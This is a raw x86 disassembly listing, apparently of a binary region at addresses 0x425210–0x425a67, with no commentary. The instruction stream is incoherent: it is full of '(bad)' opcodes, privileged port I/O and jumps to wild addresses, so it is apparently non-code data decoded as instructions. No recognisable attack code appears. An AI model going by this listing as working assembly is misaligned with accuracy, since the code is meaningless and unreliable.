  425210:	cld    
  425211:	mov    esp,0xf3f7b9fa
  425216:	(bad)  
  425217:	std    
  425218:	shl    esi,0xfe
  42521b:	jecxz  0x42521b
  42521d:	or     eax,0xf1c8d8df
  425222:	iret   
  425223:	imul   DWORD PTR [esp+ebx*8-0x371f4d51]
  42522a:	shl    BYTE PTR [edi-0x37163a0b],cl
  425230:	cli    
  425231:	leave  
  425232:	cmc    
  425233:	lock out 0xc2,al
  425236:	(bad)  
  425237:	sti    
  425238:	shl    bh,0xc9
  42523b:	cmc    
  42523c:	xabort 0xe7
  42523f:	psraw  mm5,mm4
  425242:	(bad)  
  425243:	out    0xd7,eax
  425245:	iret   
  425246:	aad    0xf4
  425248:	ret    
  425249:	mov    al,0xd6
  42524b:	mov    eax,0xcac8fafb
  425250:	hlt    
  425251:	xlat   BYTE PTR ds:[ebx]
  425252:	repz mov esp,0xbdd7f0f7
  425258:	add    ebx,ebp
  42525a:	fcmovu st,st(5)
  42525c:	or     DWORD PTR [ecx],ecx
  42525e:	enter  0x7e7,0xd9
  425262:	shl    bl,0xa5
  425265:	shl    eax,1
  425267:	in     al,dx
  425268:	retf   
  425269:	(bad)  
  42526a:	call   0xf5203224
  42526f:	jmp    0x42522b
  425271:	int    0xe2
  425273:	repz in al,dx
  425275:	add    esp,edi
  425277:	out    0xe5,eax
  425279:	(bad)  
  42527b:	cld    
  42527c:	ror    DWORD PTR [esi],0x2
  42527f:	(bad)  
  425282:	retf   
  425283:	mov    dl,0xf3
  425285:	call   0xd031005d
  42528a:	sti    
  42528b:	mov    eax,0xbac4d6fe
  425290:	int3   
  425291:	idiv   ch
  425293:	repnz add dl,bh
  425296:	hlt    
  425297:	add    eax,0x2fce707
  42529c:	sar    BYTE PTR [edx+edi*8-0x3605361c],0xe0
  4252a4:	retf   
  4252a5:	lods   eax,DWORD PTR ds:[esi]
  4252a6:	iret   
  4252a7:	jmp    0x425293
  4252a9:	div    DWORD PTR [ebx-0x442c0e50]
  4252af:	(bad)  
  4252b0:	cmc    
  4252b1:	cld    
  4252b2:	fild   DWORD PTR [edi]
  4252b4:	mov    ecx,0xddd5e5bc
  4252b9:	fcmovbe st,st(7)
  4252bb:	(bad)  
  4252bc:	(bad)  [edi]
  4252be:	out    dx,al
  4252bf:	jmp    0x4252aa
  4252c1:	fadd   st,st(5)
  4252c3:	mov    al,0xd1
  4252c5:	in     eax,0xc6
  4252c7:	aad    0xb5
  4252c9:	jmp    0x425290
  4252cb:	stc    
  4252cc:	out    0xf8,al
  4252ce:	mov    ch,0xeb
  4252d0:	clc    
  4252d1:	out    dx,eax
  4252d2:	rcl    esi,cl
  4252d4:	loope  0x4252a6
  4252d6:	not    edi
  4252d8:	(bad)  
  4252d9:	mov    esp,0xf8eeefc7
  4252de:	leave  
  4252df:	std    
  4252e0:	les    ecx,FWORD PTR [edi]
  4252e2:	mov    cl,0xe0
  4252e4:	ret    
  4252e5:	(bad)
  4252e8:	test   eax,0xe8cde6cc
  4252ed:	repnz out dx,al
  4252ef:	mov    eax,0x1bff3eb
  4252f4:	sti    
  4252f5:	neg    bl
  4252f7:	(bad)  
  4252f9:	fild   WORD PTR [edi*8-0x31350603]
  425300:	or     DWORD PTR [ecx],edx
  425302:	out    0xcf,al
  425304:	(bad)  
  425306:	loope  0x4252dd
  425308:	in     eax,dx
  425309:	test   esp,0xd2faefe8
  42530f:	cld    
  425310:	sar    al,cl
  425312:	fsubrp st(2),st
  425314:	jecxz  0x42530c
  425316:	hlt    
  425317:	clc    
  425318:	cmc    
  425319:	(bad)  
  42531a:	fcmovnu st,st(4)
  42531c:	ffree  st(0)
  42531e:	add    ebx,esi
  425320:	fsub   st(1),st
  425322:	int3   
  425323:	out    0xcd,al
  425325:	call   0xfbf7ffda
  42532a:	fnstenv [eax-0x43322108]
  425330:	mov    esp,0xb5ccfbe8
  425335:	fcmovb st,st(5)
  425337:	sar    edi,0xd5
  42533a:	cmc    
  42533b:	cmc    
  42533c:	cld    
  42533d:	fcmovnu st,st(2)
  42533f:	push   cs
  425340:	or     BYTE PTR ds:0xd3bdd8f0,al
  425346:	ret    
  425347:	jecxz  0x4252f6
  425349:	enter  0xf8f7,0xff
  42534d:	lock iret 
  42534f:	mov    ebx,0xf1dcbaf8
  425354:	iret   
  425355:	cmc    
  425356:	in     eax,dx
  425357:	add    BYTE PTR [ecx],al
  425359:	loope  0x425359
  42535b:	cld    
  42535c:	out    0xd,eax
  42535e:	add    eax,0xd0e7f313
  425363:	xlat   BYTE PTR ds:[ebx]
  425364:	mov    esi,0xc2aec7d6
  425369:	(bad)  [ebx-0x30480d49]
  42536f:	fcomp  st(6)
  425371:	(bad)  
  425372:	call   0xc109533a
  425377:	fdiv   st(0),st
  425379:	retf   
  42537a:	cmc    
  42537b:	jmp    0xd90d3e87
  425380:	fucomi st,st(5)
  425382:	stos   DWORD PTR es:[edi],eax
  425383:	mul    esp
  425385:	mov    ebp,0xedc8b2b3
  42538a:	out    dx,al
  42538b:	out    0xeb,al
  42538d:	xlat   BYTE PTR ds:[ebx]
  42538e:	icebp  
  42538f:	jmp    0xe0420853
  425394:	rcl    ebx,1
  425396:	stc    
  425397:	(bad)  
  425398:	lock out 0xbf,al
  42539b:	fcomip st,st(5)
  42539d:	(bad)  
  42539e:	into   
  42539f:	pop    es
  4253a0:	in     al,dx
  4253a1:	or     eax,0xb7cab2ca
  4253a6:	leave  
  4253a7:	loopne 0x425391
  4253a9:	jmp    0xbbda:0xe8c9f4b1
  4253b0:	fsubr  st,st(7)
  4253b2:	enter  0xe7fc,0xd5
  4253b6:	icebp  
  4253b7:	ret    
  4253b8:	add    DWORD PTR [ecx],ecx
  4253ba:	retf   0xfffa
  4253bd:	(bad)  
  4253bf:	(bad)  
  4253c0:	jmp    0xcec6:0xcac9ca05
  4253c7:	sti    
  4253c8:	sti    
  4253c9:	(bad)  
  4253ca:	int    0xee
  4253cc:	mov    ch,0xee
  4253ce:	retf   
  4253cf:	in     al,dx
  4253d0:	fdiv   st,st(7)
  4253d2:	loop   0x4253c1
  4253d4:	sti    
  4253d5:	rol    DWORD PTR [esi],1
  4253d7:	sar    al,cl
  4253d9:	rol    ah,1
  4253db:	retf   0xf9da
  4253de:	inc    BYTE PTR [ebx]
  4253e0:	add    eax,0xe8d0ece8
  4253e5:	loop   0x425396
  4253e7:	mov    dh,0xbb
  4253e9:	aad    0xc8
  4253eb:	mov    al,0xc5
  4253ed:	repz jmp 0xe0314ac0
  4253f3:	fcmovbe st,st(0)
  4253f5:	add    esi,esp
  4253f7:	lock hlt 
  4253f9:	ret    
  4253fa:	xlat   BYTE PTR ds:[ebx]
  4253fb:	retf   
  4253fc:	jmp    0x4253cd
  4253fe:	enter  0xeafb,0xcc
  425402:	mov    dl,0xe9
  425404:	jmp    0x4253e2
  425406:	xlat   BYTE PTR ds:[ebx]
  425407:	repz sti 
  425409:	icebp  
  42540a:	stc    
  42540b:	cmc    
  42540c:	fsin   
  42540e:	stc    
  42540f:	aad    0xf5
  425411:	leave  
  425412:	mov    ebp,0xdcdfd7ba
  425417:	aad    0xf1
  425419:	test   BYTE PTR [edi],0xdd
  42541c:	fsubrp st(7),st
  42541e:	in     al,0xdb
  425420:	cld    
  425421:	clc    
  425422:	out    dx,al
  425423:	mov    esi,0xefd5edcf
  425428:	in     eax,dx
  425429:	fidiv  DWORD PTR [ebx-0x1a241446]
  42542f:	sti    
  425430:	repz enter 0xd2de,0x0
  425435:	inc    ebx
  425437:	loop   0x425416
  425439:	or     edi,ebx
  42543b:	(bad)  
  42543d:	mov    esp,0x12cddff4
  425442:	retf   
  425443:	mov    dl,0xe5
  425445:	ret    0xe5ce
  425448:	mov    dh,0xe5
  42544a:	rcl    ecx,1
  42544c:	in     al,dx
  42544d:	(bad)  
  42544f:	std    
  425450:	jmp    0x425442
  425452:	int3   
  425453:	lock add bh,ah
  425456:	(bad)
  425459:	push   es
  42545a:	(bad)  
  42545b:	fcmovnbe st,st(6)
  42545d:	in     eax,dx
  42545e:	(bad)  
  42545f:	clc    
  425460:	in     eax,0xcf
  425462:	test   al,0xb1
  425464:	icebp  
  425465:	(bad)  
  425467:	xlat   BYTE PTR ds:[ebx]
  425468:	loope  0x425416
  42546a:	out    0xd5,eax
  42546c:	lock push DWORD PTR [edi+ebx*8-0x29071048]
  425474:	in     eax,dx
  425475:	aad    0xc0
  425477:	rcl    bh,1
  425479:	icebp  
  42547a:	in     al,0xf8
  42547c:	ffree  st(4)
  42547e:	std    
  42547f:	ret    0xf205
  425482:	jecxz  0x425460
  425484:	imul   ah
  425486:	fsubr  st(0),st
  425488:	loope  0x42543b
  42548a:	repz jmp 0x425471
  42548d:	mov    dh,0xd0
  42548f:	fsqrt  
  425491:	fdivr  st(1),st
  425493:	fdivr  st,st(2)
  425495:	ret    0x7fb
  425498:	mov    esp,0xf6df0ae1
  42549d:	iret   
  42549e:	push   cs
  42549f:	out    0xd,eax
  4254a1:	fucomip st,st(1)
  4254a3:	icebp  
  4254a4:	shl    eax,0xcb
  4254a7:	in     al,dx
  4254a8:	les    ebp,FWORD PTR [eax-0x12121a40]
  4254ae:	aad    0x3
  4254b0:	repnz in eax,dx
  4254b2:	aad    0xcc
  4254b4:	fmulp  st(4),st
  4254b6:	(bad)  
  4254b8:	std    
  4254b9:	div    ah
  4254bb:	in     eax,0xf5
  4254bd:	jmp    0xca4e28cf
  4254c2:	rcl    edx,cl
  4254c4:	retf   
  4254c5:	icebp  
  4254c6:	int    0xf1
  4254c8:	repnz (bad) 
  4254cb:	cli    
  4254cc:	in     eax,dx
  4254cd:	(bad)  
  4254ce:	fcomp  st(0)
  4254d0:	jmp    0xfe0f4a93
  4254d5:	fcmovnu st,st(7)
  4254d7:	rol    esp,1
  4254d9:	mov    eax,0xdf07da0a
  4254de:	or     bh,dl
  4254e0:	ror    DWORD PTR [ebx],cl
  4254e2:	in     eax,0xc4
  4254e4:	(bad)  
  4254e5:	(bad)
  4254e8:	mov    ch,0xf5
  4254ea:	out    0xdb,eax
  4254ec:	mov    ch,0xd7
  4254ee:	retf   0xc9d8
  4254f1:	shl    ebx,cl
  4254f3:	call   0xd91c4dad
  4254f8:	retf   
  4254f9:	push   es
  4254fa:	fmul   QWORD PTR [edx]
  4254fc:	aad    0xf6
  4254fe:	into   
  4254ff:	fild   WORD PTR [eax]
  425501:	adc    ebp,DWORD PTR [eax-0xd1b2c34]
  425507:	ret    0xb7ea
  42550a:	enter  0xf2ca,0xf5
  42550e:	mov    ch,0x3
  425510:	rcl    dl,cl
  425512:	fcomp  st(0)
  425514:	mov    DWORD PTR ds:0xd9e207d7,0xc604c6d6
  42551e:	fsubr  st,st(2)
  425520:	add    dl,BYTE PTR [edx]
  425522:	rol    ecx,0xa9
  425525:	(bad)  
  425526:	jmp    0xfb2d02ee
  42552b:	shl    esi,1
  42552d:	(bad)  
  42552f:	cmc    
  425530:	int3   
  425531:	(bad)  
  425533:	mov    edx,0xfcd5d8f5
  425538:	fcmovbe st,st(7)
  42553a:	(bad)  
  42553b:	out    dx,eax
  42553c:	out    dx,al
  42553d:	jecxz  0x42551b
  42553f:	in     eax,dx
  425540:	retf   0xcee7
  425543:	mov    dl,0xe3
  425545:	test   al,0xf4
  425547:	lods   al,BYTE PTR ds:[esi]
  425548:	(bad)  
  425549:	in     eax,0xe6
  42554b:	lock retf 0xdebf
  42554f:	fucomip st,st(4)
  425551:	repz (bad) 
  425553:	out    0xd2,eax
  425555:	repz (bad) 
  425557:	hlt    
  425558:	ret    0xcbd2
  42555b:	or     dh,dh
  42555d:	out    0xc8,eax
  42555f:	call   0xe1f2224d
  425564:	iret   
  425565:	out    dx,eax
  425566:	loopne 0x425528
  425568:	shr    ebx,cl
  42556a:	icebp  
  42556b:	into   
  42556c:	(bad)  
  42556d:	(bad)  
  42556e:	aad    0xc4
  425570:	mov    ebp,0xbf01feed
  425575:	out    0xc3,eax
  425577:	fsubrp st(5),st
  425579:	(bad)  
  42557a:	loopne 0x42555f
  42557c:	fdiv   st(7),st
  42557e:	out    0xcf,al
  425580:	call   0xe8334097
  425585:	mov    esp,0xe6e6aaaf
  42558a:	mov    edx,0xdfeceae4
  42558f:	(bad)  
  425590:	icebp  
  425591:	out    dx,al
  425592:	neg    ecx
  425594:	pop    es
  425595:	mov    esp,0x1bdc0c2
  42559a:	add    ecx,esp
  42559c:	push   cs
  42559d:	pop    es
  42559e:	pand   mm1,QWORD PTR [ebx]
  4255a1:	out    dx,al
  4255a2:	(bad)  
  4255a3:	stos   BYTE PTR es:[edi],al
  4255a4:	in     eax,0xb2
  4255a6:	(bad)  
  4255a7:	loopne 0x42557f
  4255a9:	jmp    0xd6224fa0
  4255ae:	in     al,dx
  4255af:	sti    
  4255b0:	mov    cl,0xee
  4255b2:	iret   
  4255b3:	add    eax,eax
  4255b5:	int3   
  4255b6:	out    0xe4,al
  4255b8:	sar    BYTE PTR [eax+edx*8-0x13fff806],1
  4255bf:	loope  0x425594
  4255c1:	or     eax,0xe4e5b2d2
  4255c6:	mov    esp,0xf4dacecd
  4255cb:	rcl    esp,1
  4255cd:	fucomi st,st(2)
  4255cf:	mov    ebx,0x7f4f6f0
  4255d4:	ffreep st(3)
  4255d6:	stc    
  4255d7:	pop    es
  4255d8:	(bad)  
  4255da:	loopne 0x4255d0
  4255dc:	fadd   DWORD PTR [edi]
  4255de:	add    al,0xa
  4255e0:	or     ebp,eax
  4255e2:	out    0xc4,eax
  4255e4:	jmp    0x4255b2
  4255e6:	fsubr  QWORD PTR [ebp-0x320d2e25]
  4255ec:	in     eax,0xcf
  4255ee:	mov    eax,0x2d0e3bd
  4255f3:	repz lock push es
  4255f6:	shl    dh,cl
  4255f8:	ret    
  4255f9:	shl    ebx,0xf9
  4255fc:	(bad)  
  4255fd:	dec    BYTE PTR [esi]
  4255ff:	call   0xd00164e7
  425604:	lods   eax,DWORD PTR ds:[esi]
  425605:	retf   
  425606:	out    dx,eax
  425607:	mov    dh,0xcd
  425609:	out    0xf5,eax
  42560b:	out    dx,eax
  42560c:	out    0xc6,al
  42560e:	fld    QWORD PTR [ebx]
  425610:	jecxz  0x4255fe
  425612:	mov    edx,0xcd07dac3
  425617:	aad    0xa
  425619:	out    0x7,eax
  42561b:	add    bh,al
  42561d:	jmp    0x42562d
  42561f:	pop    es
  425620:	std    
  425621:	rol    ecx,cl
  425623:	enter  0xa4f6,0xc3
  425627:	mov    al,0xd5
  425629:	fxch   st(6)
  42562b:	rcr    ecx,1
  42562d:	(bad)  
  42562e:	jmp    0x42560b
  425630:	idiv   esi
  425632:	fcomi  st,st(6)
  425634:	into   
  425635:	repnz repz std 
  425638:	ret    
  425639:	add    al,BYTE PTR ds:0xfbd5eed5
  42563f:	into   
  425640:	loopne 0x42560f
  425642:	loop   0x425614
  425644:	shl    DWORD PTR [edi-0x3e2b3b1b],0xe5
  42564b:	(bad)  
  42564c:	aam    0xd2
  42564e:	jmp    0xd1e7:0xf9c8d3bd
  425655:	clc    
  425656:	loope  0x42563b
  425658:	loop   0x42561a
  42565a:	(bad)  
  42565c:	loopne 0x42566c
  42565e:	add    edi,ebx
  425660:	fld    QWORD PTR ds:0xe8dff0f1
  425666:	into   
  425667:	aam    0xd1
  425669:	loop   0x425654
  42566b:	mov    ecx,0xf4f9f9e8
  425670:	(bad)  
  425671:	fidivr DWORD PTR [esi-0x132a0604]
  425677:	test   bh,0xfd
  42567a:	add    al,0xa
  42567c:	(bad)  
  42567e:	jmp    0xc8e2:0xec0dcdee
  425685:	lods   al,BYTE PTR ds:[esi]
  425686:	jmp    0xd40b0753
  42568b:	retf   0xb6b5
  42568e:	fdivr  st(4),st
  425690:	mov    esp,0xb8f9d7bf
  425695:	ret    
  425696:	clc    
  425697:	in     eax,0x3
  425699:	or     eax,ebx
  42569b:	clc    
  42569c:	test   esi,0xde901f4
  4256a2:	mov    dl,0xd1
  4256a4:	mov    bl,0xe1
  4256a6:	(bad)  
  4256a7:	test   ebp,0xfacfb0e2
  4256ad:	xlat   BYTE PTR ds:[ebx]
  4256ae:	leave  
  4256af:	fnsave [ecx-0x505fe12]
  4256b5:	(bad)  
  4256b6:	int3   
  4256b7:	rol    edx,cl
  4256b9:	loope  0x4256b8
  4256bb:	out    0xc7,al
  4256bd:	out    dx,eax
  4256be:	(bad)  
  4256bf:	iret   
  4256c0:	(bad)  
  4256c1:	jmp    0xeeae:0xb1e5a8dd
  4256c8:	retf   0xf2c1
  4256cb:	mov    dh,0xcc
  4256cd:	mov    ch,0xbe
  4256cf:	repz std 
  4256d1:	icebp  
  4256d2:	loop   0x4256cd
  4256d4:	ret    
  4256d5:	fsubr  st(4),st
  4256d7:	(bad)  
  4256d8:	add    BYTE PTR [ebx*8-0x16053502],al
  4256df:	iret   
  4256e0:	or     al,al
  4256e2:	in     eax,0xca
  4256e4:	mov    al,0xd3
  4256e6:	out    dx,al
  4256e7:	leave  
  4256e8:	lock sti 
  4256ea:	scas   eax,DWORD PTR es:[edi]
  4256eb:	retf   0xe6c9
  4256ee:	jmp    0x2f7:0xefded9bc
  4256f5:	ret    
  4256f6:	rcr    ah,0xc5
  4256f9:	(bad)  
  4256fa:	icebp  
  4256fb:	add    al,0xdc
  4256fd:	les    eax,FWORD PTR [esi]
  4256ff:	syscall 
  425701:	(bad)  
  425703:	retf   
  425704:	(bad)  
  425706:	xlat   BYTE PTR ds:[ebx]
  425707:	mov    al,0xb7
  425709:	in     al,dx
  42570a:	hlt    
  42570b:	(bad)  
  42570c:	test   edx,0xe9b8b5d8
  425712:	mov    ecx,0xd2c1f4de
  425717:	rcr    al,cl
  425719:	loopne 0x425714
  42571b:	add    ecx,DWORD PTR [ebx]
  42571d:	in     eax,0xe
  42571f:	add    BYTE PTR [ecx],al
  425721:	rol    edi,cl
  425723:	(bad)
  425726:	retf   
  425727:	shl    DWORD PTR [ebx+ebp*8-0x28064631],1
  42572e:	xlat   BYTE PTR ds:[ebx]
  42572f:	sti    
  425730:	retf   0xc3db
  425733:	cli    
  425734:	cli    
  425735:	in     al,dx
  425736:	out    0xc3,eax
  425738:	in     al,0xf4
  42573a:	xlat   BYTE PTR ds:[ebx]
  42573b:	fadd   QWORD PTR [eax]
  42573d:	out    dx,al
  42573e:	(bad)
  425741:	les    esi,FWORD PTR [ebx-0x3d4d4f33]
  425747:	leave  
  425748:	mov    bl,0xd7
  42574a:	lock (bad) 
  42574c:	clc    
  42574d:	retf   
  42574e:	fdiv   st(3),st
  425750:	div    edx
  425752:	(bad)  
  425754:	mov    esp,0xfed004dc
  425759:	aam    0x7
  42575b:	fsubr  st(6),st
  42575d:	jmp    0xed0c3336
  425762:	(bad)  
  425764:	in     al,dx
  425765:	enter  0xd1cc,0xd2
  425769:	mov    bh,0xd8
  42576b:	ror    ecx,1
  42576d:	call   0xcb211037
  425772:	jmp    0xe3104f45
  425777:	in     eax,0x4
  425779:	jmp    esi
  42577b:	retf   
  42577c:	pop    es
  42577d:	out    dx,al
  42577e:	out    dx,al
  42577f:	fmul   st(4),st
  425781:	shl    bh,cl
  425783:	lods   al,BYTE PTR ds:[esi]
  425784:	shl    dl,1
  425786:	(bad)  
  425787:	xlat   BYTE PTR ds:[ebx]
  425788:	in     eax,0xc1
  42578a:	repnz mov dh,0xe4
  42578d:	fsin   
  42578f:	mov    edx,0xd9fecd03
  425794:	rcl    esi,0xf9
  425797:	(bad)
  42579b:	aam    0xe9
  42579d:	add    al,BYTE PTR [edx]
  42579f:	in     eax,0xcc
  4257a1:	in     eax,0xb8
  4257a3:	leave  
  4257a4:	mov    edi,0xd4e5cef1
  4257a9:	mov    bh,0xb6
  4257ab:	cmc    
  4257ac:	iret   
  4257ad:	mov    ecx,0xc2c3d8d6
  4257b2:	mov    ecx,0x2bee2ec
  4257b7:	rcl    bl,0x2
  4257ba:	mul    ecx
  4257bc:	fld    QWORD PTR [edi]
  4257be:	loopne 0x4257bf
  4257c0:	fstp   st(5)
  4257c2:	jmp    0xd4cf:0xe2dee4a9
  4257c9:	in     eax,dx
  4257ca:	mov    dl,0xea
  4257cc:	aad    0xb6
  4257ce:	std    
  4257cf:	mov    dl,0xdd
  4257d1:	mov    ebp,0xbff6eefc
  4257d6:	in     eax,0xda
  4257d8:	fcmovnu st,st(4)
  4257da:	rol    BYTE PTR [ebx],1
  4257dc:	clc    
  4257dd:	(bad)
  4257e0:	in     al,dx
  4257e1:	retf   
  4257e2:	jmp    0xd5ed:0xcaf1dde3
  4257e9:	mov    cl,0xf7
  4257eb:	int3   
  4257ec:	in     al,0xd5
  4257ee:	fcom   st(6)
  4257f0:	clc    
  4257f1:	fadd   st(2),st
  4257f3:	aad    0xd8
  4257f5:	mov    ah,0xf1
  4257f7:	fcmovb st,st(7)
  4257f9:	fucompp 
  4257fb:	out    0xe3,eax
  4257fd:	or     edi,ebx
  4257ff:	or     eax,ecx
  425801:	(bad)  
  425802:	jmp    0x4257cb
  425804:	in     eax,dx
  425805:	leave  
  425806:	mov    dh,0xd6
  425808:	mov    ah,0xf9
  42580a:	mov    ah,0xea
  42580c:	rol    ch,cl
  42580e:	clc    
  42580f:	mov    edx,0xcff7cf03
  425814:	add    ebp,ebp
  425816:	neg    bh
  425818:	add    dl,cl
  42581a:	mov    edi,0x80ffce7
  42581f:	clc    
  425820:	push   es
  425821:	in     al,0xb2
  425823:	ret    0xc6d6
  425826:	mov    al,0xb3
  425828:	icebp  
  425829:	retf   
  42582a:	jmp    0xba3546df
  42582f:	mov    dl,0xd6
  425831:	fyl2xp1 
  425833:	stc    
  425834:	frstpm(287 only) 
  425836:	fcomip st,st(1)
  425838:	out    0xc1,al
  42583a:	(bad)
  42583d:	out    dx,eax
  42583e:	aam    0xee
  425840:	fst    QWORD PTR [edx]
  425842:	lock mov cl,0xca
  425845:	in     eax,0xc7
  425847:	(bad)  
  425848:	ret    
  425849:	into   
  42584a:	int3   
  42584b:	sti    
  42584c:	mov    ah,0xb8
  42584e:	out    dx,al
  42584f:	jmp    0xe303:0xe1c8e3fe
  425856:	add    eax,0xdaf6e0c4
  42585b:	lock std 
  42585d:	loopne 0x425840
  42585f:	pop    es
  425860:	fcomi  st,st(3)
  425862:	loopne 0x42584d
  425864:	shr    DWORD PTR [ebp+edi*4-0x31482e30],cl
  42586b:	fbstp  TBYTE PTR [eax-0x45002902]
  425871:	cli    
  425872:	xlat   BYTE PTR ds:[ebx]
  425873:	out    dx,al
  425874:	(bad)  
  425876:	add    eax,DWORD PTR [ebx+edi*8]
  425879:	(bad)  
  42587a:	aad    0xea
  42587c:	add    ecx,esi
  42587e:	loop   0x42584d
  425880:	stc    
  425881:	pop    es
  425882:	(bad)  
  425883:	ffreep st(5)
  425885:	repnz out dx,al
  425887:	not    ch
  425889:	loopne 0x425852
  42588b:	(bad)  
  42588d:	fst    st(0)
  42588f:	hlt    
  425890:	fnstsw WORD PTR [esi-0xf0a3e20]
  425896:	in     eax,dx
  425897:	(bad)  
  425899:	(bad)  
  42589a:	fadd   st,st(0)
  42589c:	add    dh,bh
  42589e:	loope  0x425868
  4258a0:	push   es
  4258a1:	fcom   st(0)
  4258a3:	lods   eax,DWORD PTR ds:[esi]
  4258a4:	test   al,0xd7
  4258a6:	jmp    0x42588b
  4258a8:	shl    ebp,1
  4258aa:	int3   
  4258ab:	fcmovnb st,st(6)
  4258ad:	in     eax,0xd2
  4258af:	retf   
  4258b0:	int3   
  4258b1:	stc    
  4258b2:	repz hlt 
  4258b4:	(bad)  
  4258b6:	mov    esi,0x2fb01c1
  4258bb:	aam    0xf7
  4258bd:	std    
  4258be:	or     ch,bl
  4258c0:	or     al,0x1
  4258c2:	scas   eax,DWORD PTR es:[edi]
  4258c3:	in     al,0xc1
  4258c5:	loop   0x42587c
  4258c7:	aad    0xc1
  4258c9:	(bad)  
  4258ca:	mov    ecx,0xd6d5f6ca
  4258cf:	fdiv   st(6),st
  4258d1:	in     eax,dx
  4258d2:	(bad)  
  4258d4:	fmul   st(4),st
  4258d6:	mov    ebp,0xe1d1b907
  4258db:	ror    bh,0xc4
  4258de:	loopne 0x4258ed
  4258e0:	jecxz  0x4258e6
  4258e2:	rcr    esp,0xb0
  4258e5:	xlat   BYTE PTR ds:[ebx]
  4258e6:	cmc    
  4258e7:	mov    bl,0xdb
  4258e9:	mov    bh,0xf2
  4258eb:	retf   0xf8c8
  4258ee:	in     eax,0xeb
  4258f0:	leave  
  4258f1:	ret    0xf3
  4258f4:	ret    0xf0e1
  4258f7:	fadd   QWORD PTR [eax]
  4258f9:	(bad)  
  4258fa:	(bad)  
  4258fb:	leave  
  4258fc:	retf   
  4258fd:	out    dx,eax
  4258fe:	call   0xd94034eb
  425903:	call   0xc2f50bf5
  425908:	loope  0x4258d6
  42590a:	repnz retf 0xfad4
  42590e:	jmp    0xdee2:0xe8ccfaf5
  425915:	sti    
  425916:	(bad)  
  425917:	fucom  st(6)
  425919:	repnz cli 
  42591b:	add    DWORD PTR [ecx],eax
  42591d:	(bad)  
  42591e:	out    0xe6,al
  425920:	jmp    0xd6c6:0xd0cae5ce
  425927:	rcl    eax,cl
  425929:	(bad)  
  42592a:	into   
  42592b:	div    ebp
  42592d:	(bad)  
  42592e:	repz add ebp,ecx
  425931:	cli    
  425932:	int3   
  425933:	mov    ebp,0xe0d1fcd9
  425938:	add    al,BYTE PTR [ebx]
  42593a:	rol    edx,0xe1
  42593d:	div    ch
  42593f:	push   cs
  425940:	cld    
  425941:	cld    
  425942:	ret    0xd0eb
  425945:	fsubrp st(2),st
  425947:	int3   
  425948:	leave  
  425949:	loop   0x425932
  42594b:	retf   
  42594c:	shr    ch,1
  42594e:	mov    ah,0xbf
  425950:	(bad)  
  425951:	(bad)  
  425953:	cld    
  425954:	add    eax,edx
  425956:	stc    
  425957:	repnz rcl cl,1
  42595a:	jmp    0xebd9:0xdbe9eac4
  425961:	add    ch,dl
  425963:	(bad)  
  425964:	xlat   BYTE PTR ds:[ebx]
  425965:	icebp  
  425966:	mov    bh,0xd3
  425968:	ror    bh,0xd4
  42596b:	enter  0xacfb,0xe8
  42596f:	retf   
  425970:	(bad)  
  425971:	faddp  st(3),st
  425973:	mov    dh,0xcd
  425975:	(bad)  
  425977:	repz cmc 
  425979:	xlat   BYTE PTR ds:[ebx]
  42597a:	aad    0x6
  42597c:	xlat   BYTE PTR ds:[ebx]
  42597d:	iret   
  42597e:	fimul  WORD PTR [edi]
  425980:	fisttp DWORD PTR [eax+esi*8]
  425983:	lods   eax,DWORD PTR ds:[esi]
  425984:	(bad)  
  425985:	out    dx,al
  425986:	in     eax,0xdb
  425988:	int3   
  425989:	aam    0xbb
  42598b:	leave  
  42598c:	in     al,0xed
  42598e:	jmp    0xdafb4a47
  425993:	enter  0xc3f6,0xfd
  425997:	cld    
  425998:	loope  0x425973
  42599a:	or     cl,al
  42599c:	idiv   ah
  42599e:	out    dx,al
  42599f:	std    
  4259a0:	sti    
  4259a1:	loope  0x42594b
  4259a3:	rol    dl,1
  4259a5:	(bad)  
  4259a6:	scas   eax,DWORD PTR es:[edi]
  4259a7:	jmp    0xace5:0xe7eed3a9
  4259ae:	retf   0xfefd
  4259b1:	mov    esi,0xecefceba
  4259b6:	clc    
  4259b7:	loop   0x425992
  4259b9:	aad    0xcb
  4259bb:	fchs   
  4259bd:	hlt    
  4259be:	or     ebx,ebx
  4259c0:	loopne 0x4259a5
  4259c2:	repz (bad) 
  4259c4:	jecxz  0x4259b0
  4259c6:	(bad)  
  4259c7:	shl    DWORD PTR [ebx+edi*8-0x45322e40],cl
  4259ce:	in     al,dx
  4259cf:	(bad)  
  4259d1:	(bad)  
  4259d3:	call   0xe81d33c5
  4259d8:	jmp    0x4259df
  4259da:	rol    BYTE PTR [esi],1
  4259dc:	stc    
  4259dd:	add    esp,edi
  4259df:	add    BYTE PTR [ecx],al
  4259e1:	jecxz  0x4259bc
  4259e3:	xlat   BYTE PTR ds:[ebx]
  4259e4:	(bad)  
  4259e5:	retf   0xd5ac
  4259e8:	out    dx,eax
  4259e9:	mov    ah,0xf7
  4259eb:	fnstenv [esp+eiz*8-0x30334730]
  4259f2:	mov    esp,0x2fee1ba
  4259f7:	std    
  4259f8:	add    ebp,ecx
  4259fa:	jmp    0xde4429ee
  4259ff:	in     eax,dx
  425a00:	into   
  425a01:	jmp    0x4259e5
  425a03:	mov    ebp,0xc9d7acbc
  425a08:	div    ebx
  425a0a:	sti    
  425a0b:	leave  
  425a0c:	(bad)  
  425a0e:	(bad)  
  425a0f:	leave  
  425a10:	out    dx,al
  425a11:	ret    
  425a12:	cld    
  425a13:	in     al,dx
  425a14:	cld    
  425a15:	std    
  425a16:	in     al,0xfa
  425a18:	jmp    0xcdff:0xcadbc7f8
  425a1f:	in     al,0xd
  425a21:	jecxz  0x4259eb
  425a23:	scas   al,BYTE PTR es:[edi]
  425a24:	repz out 0xe2,eax
  425a27:	lods   al,BYTE PTR ds:[esi]
  425a28:	mov    bl,0xe1
  425a2a:	mul    ebp
  425a2c:	fmul   st,st(5)
  425a2e:	(bad)  
  425a30:	(bad)  
  425a31:	std    
  425a32:	out    dx,eax
  425a33:	into   
  425a34:	clc    
  425a35:	(bad)  
  425a36:	(bad)  
  425a37:	(bad)  
  425a39:	jmp    0x425a26
  425a3b:	loopne 0x425a41
  425a3d:	call   0xd4406029
  425a42:	mov    ecx,0xb5afddf3
  425a47:	sti    
  425a48:	jmp    0xdf2843fe
  425a4d:	repz mov ch,0xfd
  425a50:	mov    ebx,0xd0f9d7dc
  425a55:	add    eax,0xc20b0602
  425a5a:	jmp    0xd8c9:0xe6e1bdea
  425a61:	in     eax,dx
  425a62:	ret    
  425a63:	loop   0x425a58
  425a65:	loope  0x425a34
  425a67:	call   0xc71a2a35
